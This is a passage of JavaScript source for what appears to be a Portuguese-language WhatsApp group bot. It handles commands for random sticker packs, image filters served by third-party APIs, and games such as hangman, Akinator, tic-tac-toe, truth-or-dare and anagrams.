await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'pack-figu':
case 'figu-pack':
botaoale = [
{title: "SELECIONE UM DA LISTA",
rows: [
        {title: "[ü©∏] ùêåùêÑùêåùêÑùêí [ü©∏]", rowId: `${prefix}figmeme`, description: "figurinhas de memes"},
	    {title: "[ü©∏] ùêÄùêçùêàùêåùêÑ [ü©∏]", rowId: `${prefix}fig-anime`, description: "figurinhas de anime"},
	    {title: "[ü©∏] ùêíùêìùêàùêÇùêäùêÑùêë [ü©∏]", rowId: `${prefix}fig-desenho`, description: "figurinhas de sticker"},
	    {title: "[ü©∏] ùêëùêéùêÅùêãùêéùêó [ü©∏]", rowId: `${prefix}fig-roblox`, description: "figurinhas de roblox"},
	    {title: "[ü©∏] ùêÇùêéùêëùêÑùêÄùêçùêÄ [ü©∏]", rowId: `${prefix}fig-coreana`, description: "figurinhas da coreana"},
	    {title: "[ü©∏] ùêëùêÄùêàùêïùêÄ [ü©∏]", rowId: `${prefix}fig-raiva`, description: "figurinhas de raiva"},
	    {title: "[ü©∏] ùêÑùêçùêÜùêëùêÄùêÇÃßùêÄùêÉùêÄùêí [ü©∏]", rowId: `${prefix}figuengracado`, description: "figurinhas engra√ßadas"}]
}]
sendlistA(from, ` [ü©∏] CARRINHO DE FIGU [ü©∏]`, ` ${NomeDoBot} `, "", "[ü©∏] ùêãùêàùêíùêìùêÄ ùêÉùêÑ ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄ [ü©∏]", botaoale)
break

case 'fig-meme':
case 'figmeme':
case 'fig-memes':
case 'figumeme':
const memez = `${Math.floor(Math.random() * 130)}`
const memeu = `${Math.floor(Math.random() * 130)}`
const memep = `${Math.floor(Math.random() * 130)}`
const memei = `${Math.floor(Math.random() * 130)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/Figurinha-meme/${memez}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/Figurinha-meme/${memeu}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/Figurinha-meme/${memep}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/Figurinha-meme/${memei}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas de meme?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'figudesenho':
case 'fig-desenho':
case 'fig-desenhos':
const desenhoa = `${Math.floor(Math.random() * 102)}`
const desenhoe = `${Math.floor(Math.random() * 102)}`
const desenhoi = `${Math.floor(Math.random() * 102)}`
const desenhoo = `${Math.floor(Math.random() * 102)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-desenho/${desenhoa}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-desenho/${desenhoe}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-desenho/${desenhoi}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-desenho/${desenhoo}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas de desenho?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: info}) }, 2090)

break

case 'figuanime':
case 'fig-anime':
case 'fig-animes':
const annime = `${Math.floor(Math.random() * 77)}`
const annnime = `${Math.floor(Math.random() * 77)}`
const annnnime = `${Math.floor(Math.random() * 77)}`
const nnnannime = `${Math.floor(Math.random() * 77)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-anime/${annime}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-anime/${annnime}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-anime/${annnnime}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-anime/${nnnannime}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas de anime?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'figuraiva':
case 'fig-raiva':
case 'figraiva':
const raivaa = `${Math.floor(Math.random() * 29)}`
const raivae = `${Math.floor(Math.random() * 29)}`
const raivai = `${Math.floor(Math.random() * 29)}`
const raivao = `${Math.floor(Math.random() * 29)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-raiva/${raivaa}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-raiva/${raivae}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-raiva/${raivai}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-raiva/${raivao}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas de raiva?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'figuroblox':
case 'fig-roblox':
case 'figroblox':
const robloxa = `${Math.floor(Math.random() * 21)}`
const robloxe = `${Math.floor(Math.random() * 21)}`
const robloxi = `${Math.floor(Math.random() * 21)}`
const robloxo = `${Math.floor(Math.random() * 21)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-roblox/${robloxa}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-roblox/${robloxe}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-roblox/${robloxi}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-roblox/${robloxo}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas de Roblox?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'figubb':
case 'fig-coreana':
const bba = `${Math.floor(Math.random() * 21)}`
const bbe = `${Math.floor(Math.random() * 21)}`
const bbi = `${Math.floor(Math.random() * 21)}`
const bbo = `${Math.floor(Math.random() * 21)}`

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-coreana/${bba}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-coreana/${bbe}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-coreana/${bbi}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-coreana/${bbo}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas dc Coreana?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'figuengracado':
case 'fig-engracada':
case 'fig-engra√ßada':
const engraa = `${Math.floor(Math.random() * 25)}`
const engrae = `${Math.floor(Math.random() * 25)}`
const engrai = `${Math.floor(Math.random() * 25)}`
const engrao = `${Math.floor(Math.random() * 25)}`

 popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-engracadas/${engraa}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-engracadas/${engrae}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-engracadas/${engrai}.webp`)
pl.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./fun√ß√µes de cmd/FIGURINHAS/figurinha-engracadas/${engrao}.webp`)
pl.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ pl.sendMessage(from, {text: 'Deseja mais figurinhas engra√ßadas?', footer: `Escolha uma op√ß√£o abaixo.`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'MAIS FIGURINHA'}, type: 1}]}, {quoted: selo}) }, 2090)

break

case 'arma':
case 'figuarma':
if ((isMedia && !m.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : m
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`https://api-exteam.herokuapp.com/api/gun?img=${link}`)
pl.sendMessage(from, {image: postt}, {quoted: selo})
} else {
reply('Selecione uma imagem...!')
}
break

case 'lgbt':  
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`https://api-manuella2-pl.herokuapp.com/canvas/lgbt?url=${link}&apikey=${keyapi}`)
pl.sendMessage(from, {image: postt}, {quoted: info})
} else {
reply('Selecione uma imagem...!')
}
} catch {
reply('ERROR')
}
break

case 'rip':  
case 'morto':  
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`http://api-manuella2-pl.herokuapp.com/canvas/rip?url=${link}&apikey=${PLkey}`)
pl.sendMessage(from, {image: postt}, {quoted: info})
} else {
reply('Selecione uma imagem...!')
}
} catch {
reply('ERROR')
}
break

case 'triggered':
try {
if(!isQuotedImage) return reply("Marque uma imagem")
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo : info
imagem = await downloadContentFromMessage(boij, 'image')
owgi = Buffer.from([])
for await(const send of imagem) { owgi = Buffer.concat( [ owgi, send ] ) }
res = await upload(owgi)
post = await fetchJson(`https://api-manuella2-pl.herokuapp.com/canvas/trigger?url=${res}&apikey=${PLkey}`)
sendStickerFromUrl(from, {sticker: post}, {quoted:info})
} else {
reply('error')
}
} catch {
reply('ERROR')
}
break
//========IN√çCIO DOS JOGOS=============

case 'eununca': {

	const perg = (eununca[Math.floor(Math.random() * eununca.length)])
let buttonss = [

                    {buttonId: `${prefix}ja`, buttonText: {displayText: 'Eu j√°'}, type: 1},
                    {buttonId: `${prefix}nunca`, buttonText: {displayText: 'Eu nunca'}, type: 1}]
                let bb = {
                    text: `${perg}`,
                    footer: '¬©  _Copyright by Yuri Modz__',
                    buttons: buttonss,
                    headerType: 2
                }
                pl.sendMessage(from, bb, {quoted: selo})
            }
break

case 'ja': {
let aa = [
                    {buttonId: `${prefix}eununca`, buttonText: {displayText: 'Pr√≥xima pergunta!'}, type: 1}]
                let bb = {
                    text: `Rapaz nem vou comentar nada pq se eu falar t√¥ errado.`,
                    footer: '¬©  _Copyright by Yuri Modz__',
                    buttons: aa,
                    headerType: 2
                }
                pl.sendMessage(from, bb, {quoted: selo})
            }
break

case 'nunca': {
let aa = [
                    {buttonId: `${prefix}eununca`, buttonText: {displayText: 'Pr√≥xima pergunta!'}, type: 1}]
                let bb = {
                    text: `Finalmente um santinho por aqui ou est√° fingindo hein? üò≥`,
                    footer: '¬©  _Copyright by Yuri Modz__',
                    buttons: aa,
                    headerType: 2
                }
                pl.sendMessage(from, bb, {quoted: selo})
            }
break

case 'pgt_desafio':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
sunsen = `üåπ *Pergunta / Desafio* üåπ

Escolha uma op√ß√£o abaixo entre pergunta e desafio, responda ou complete oque voc√™ escolheu, ou se preferir, pule.

As perguntas e desafios s√£o a meu crit√©rio, e ai, vamos jogar?`
sendBtext(from,sunsen, `${NomeDoBot}`, [{buttonId: `${prefix}pergunta`, buttonText: {displayText: `üåπ PERGUNTA üåπ`}, type: 1}, {buttonId: `${prefix}desafio`, buttonText: {displayText: `üåπ DESAFIO üåπ`}, type: 1}], selo)
break

case 'pergunta':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await pl.sendMessage(from, {react: { text: "üòá", key: info.key }})
sunsen = JSON.parse(fs.readFileSync("./lib/pgt.json"))
moon = sunsen[Math.floor(Math.random() * sunsen.length)]
sendBtext(from,moon, `${NomeDoBot}`, [{buttonId: `${prefix}pergunta`, buttonText: {displayText: `üåπ PR√ìXIMA PERGUNTA üåπ`}, type: 1}, {buttonId: `${prefix}desistir`, buttonText: {displayText: `üåπ DESISTIR üåπ`}, type: 1}], selo) 
break

case 'gato':
if (!q) {
bufft = `https://cataas.com/cat`
} else {
bufft = `https://cataas.com/cat/says/${q}`
}
pl.sendMessage(from, {image: {url: bufft}, caption: 'Prontinho ‚úì'}, {quoted: selo})
break

case 'desafio':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await pl.sendMessage(from, {react: { text: "üòà", key: info.key }})
sunsen = JSON.parse(fs.readFileSync("./lib/desafio.json"))
moon = sunsen[Math.floor(Math.random() * sunsen.length)]
sendBtext(from,moon, `${NomeDoBot}`, [{buttonId: `${prefix}desafio`, buttonText: {displayText: `üåπ PR√ìXIMO DESAFIO üåπ`}, type: 1}, {buttonId: `${prefix}desistir`, buttonText: {displayText: `üåπ DESISTIR üåπ`}, type: 1}], selo) 
break

case 'desistir':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await pl.sendMessage(from, {react: { text: "üôÑ", key: info.key }})
reply (`${pushname} que triste, n√£o aguentou a jogar e pediu desist√™ncia, que triste mas fazer oque n√©...`)
break


case 'resetaki':
try {
if(akinator[0][from] && akinator[0][from].player != sender && !isGroupAdmins && !SoDono) return reply('*N√£o √© voc√™ que est√° jogando*')
akinator[0][from] = undefined
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/akinator.json', JSON.stringify(akinator, null, 2))
buttons_opts = [
{buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'akinator nao', buttonText: {displayText: 'N√£o'}, type: 1},
]
sendbuttonsMessage = {
text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida?*`,
footer: 'Sim ou n√£o?',
buttons: buttons_opts,
headerType: 1
}
pl.sendMessage(from, sendbuttonsMessage)
} catch {
reply("Nenhuma sess√£o em andamento...")
}
break
case 'respaki':
if(!info.message.listResponseMessage) return
if(akinator[0][from] && akinator[0][from].player != sender) return reply('*N√£o √© voc√™ que est√° jogando*')
if(args.length < 1) return 
await akinator[0][from].game.step(args[0])
if(akinator[0][from].game.progress > 85) {
    await akinator[0][from].game.win()
    teks = `Por acaso seu personagem √© ${akinator[0][from].game.answers[0].name}?`
    buttons_opts = [
{buttonId: 'finaki sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'finaki nao', buttonText: {displayText: 'N√£o'}, type: 1},
    ]
    sendbuttonsMessage = {
image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
caption: `J√° sei!\n\n${teks}`,
footer: 'Sim ou n√£o?',
buttons: buttons_opts,
headerType: 1
    }
    pl.sendMessage(from, sendbuttonsMessage)
} else {
    listMessage = {
text: akinator[0][from].game.question,
footer: 'Mostrar op√ß√µes',
buttonText: 'Op√ß√µes',
title: "Pergunta",
sections: [{
title: 'Op√ß√µes',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'N√£o',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'N√£o sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente n√£o',
description: ''
}]
}]
    }
    pl.sendMessage(from, listMessage)
}
break
case 'akinator':
buttons_opts = [
    {buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
    {buttonId: 'akinator nao', buttonText: {displayText: 'N√£o'}, type: 1},
]
sendbuttonsMessage = {
    image: fs.readFileSync('./m√≠dia-ft-vd/fotos/akame.jpg'),
    caption: "Ol√°, sou o akinator",
    footer: 'Vamos jogar um jogo?',
    buttons: buttons_opts,
    headerType: 1
}
pl.sendMessage(from, sendbuttonsMessage)
break

case 'resetforca':
if(!isPlayForca) return reply(`*Voc√™ n√£o iniciou uma partida, para iniciar d√™ o comando ${prefix}jogodaforca*`)
pla_pos = allForcaId.indexOf(sender)
forca.splice(pla_pos, 1)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Jogo da forca reiniciado com sucesso. Para iniciar outra partida d√™ o comando ${prefix}jogodaforca*`)
break

case 'forca':
if(!isPlayForca) return reply(`*Voc√™ n√£o iniciou uma partida, para iniciar d√™ o comando ${prefix}jogodaforca*`)
if(args.length < 1) return reply(`*D√™ o comando mais a letra para advinhar*`)
if(args[0].trim().length < 2) {
    p_pos = allForcaId.indexOf(sender)
    find = forca[p_pos].word.match(args[0].toLowerCase())
    is_correct = false 
    while(find != null) {
res_tmp = forca[p_pos].word.indexOf(args[0].toLowerCase())
forca[p_pos].array_under_word[res_tmp] = args[0].toLowerCase()
forca[p_pos].array_word[res_tmp] = 0
forca[p_pos].word = forca[p_pos].word.replace(args[0].toLowerCase(), 0)
find = forca[p_pos].word.match(args[0].toLowerCase())
is_correct = true
    }
    if(is_correct) {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
attempts = forca[p_pos].attempts
if(str_under == forca[p_pos].word_original) {
reply(`*Parab√©ns, Voc√™ venceu o jogo!‚úÖü•≥*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
} else {
reply(`*Voc√™ acertou!‚úÖ*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_\n*Voc√™ tem ${attempts} chances*`)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
}
    } else  {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Voc√™ perdeu o jogo!‚ùå*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Voc√™ errou!‚ùå*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Voc√™ tem ${attempts} chances*`)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
} else {
    p_pos = allForcaId.indexOf(sender)
    if(forca[p_pos].word_original == args[0].toLowerCase()) {
attempts = forca[p_pos].attempts
reply(`*Parab√©ns, Voc√™ venceu o jogo!‚úÖü•≥*\n\n${puppet[attempts]}\n\n_*Palavra: ${forca[p_pos].word_original.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
    } else {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Voc√™ perdeu o jogo!‚ùå*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Voc√™ errou!‚ùå*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Voc√™ tem ${attempts} chances*`)
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
}
break

case 'jogodaforca':
if(isPlayForca) return reply(`*Termine a partida iniciada para jogar uma nova, ou d√™ o comando ${prefix}resetforca*`)
word_correct = (await randompalavra()).slice(1).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase()
under_word = '-'.repeat(word_correct.length)
forca.push({
    id: sender,
    word_original: word_correct,
    word: word_correct,
    under_word: under_word,
    array_word: Array.from(word_correct),
    array_under_word: Array.from(under_word),
    tam: word_correct.length,
    attempts: 6
})
fs.writeFileSync('./fun√ß√µes/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Jogo da forca iniciado!‚úÖ*\n\n*Palavra: ${under_word.split('').join(' ')}*\n*Para advinhar uma letra , d√™ o comando ${prefix}forca mais a letra*`)
break

case 'reagir': {
 reactionMessage = {
    react: {
text: args[0],
key: { remoteJid: from, fromMe: false, id: quoted.id }
    }
}
pl.sendMessage(from, reactionMessage)
}
break       


case 'jogodavelha':
if(!isGroup) return reply('comando apenas para grupos')
joguinhodavelhajs.push(sender)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if (fs.existsSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*
     
[‚ùó] Algu√©m est√° jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}
     
‚ùå : @${boardnow.X}
‚≠ï : @${boardnow.O}
     
 Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
pl.sendMessage(from, {text: chatMove}, {quoted: m,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(`*‚üÖ‚ùó‚üÜ Jogue com Alguem!!!!*
*para inicar a partida : ${prefix + command} @membro do gp*`);
const boardnow = setGame(`${from}`);
console.log(`Start No jogodavelha ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*„Äéüìå·é¨’è·è¢·é¨·é°·é™Œù·é†œ¥ œ¥ œ¥·è¢œ¥Œù·é¨ŒùÕ≤·é¨‚öîÔ∏è„Äè*
     
@${sender.replace("@s.whatsapp.net",
"")} _est√° te desafiando para uma partida de jogo da velha..._
_[ ${argss[1]} ] Use *„ÄéS„Äè* para aceitar ou *„ÄéN„Äè* para n√£o aceitar..._
     `;
pl.sendMessage(from, {text: strChat}, {quoted: m,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break


case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv': 
if (!isJoguin && !isGroupAdmins) return reply(`Fale com quem iniciou o jogo, s√≥ ele pode resetar, ou ent√£o algum ADM`)
if (fs.existsSync("./fun√ß√µes de cmd/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./fun√ß√µes de cmd/tictactoe/db/" + from + ".json");
reply(`Jogo da velha resetado com sucesso nesse grupo!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
reply(`N√£o a nenhuma sess√£o em andamento...`);
}
break

case 'anagrama':
if(!isGroup) return reply('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return reply('comando apenas para admins')
if(args.length == 0) return reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./fun√ß√µes de cmd/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./fun√ß√µes de cmd/anagrama-${from}.json`))
reply(`o jogo j√° foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./fun√ß√µes de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
pl.sendMessage(from, {text: `
‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚âΩ„Äå üëæ ANAGRAMA üëæ „Äç
‚îÇ‚ûΩ DESCUBRA A PALAVRA
‚îÇ‚ûΩ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
‚îÇ‚ûΩ DICA: ${palavrasANA[anaaleatorio].dica}
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
`})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./fun√ß√µes de cmd/anagrama-${from}.json`)) return reply('n√£o tem como desativar o jogo do anagrama p√¥s ele n√£o foi ativado')
fs.unlinkSync(`./fun√ß√µes de cmd/anagrama-${from}.json`)
reply("desativado com sucesso")
}
await limitAdd(sender)
break


case 'perfil':
try {
ppimg = await pl.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
var bio = await pl.fetchStatus(sender)
var bioo = bio.status
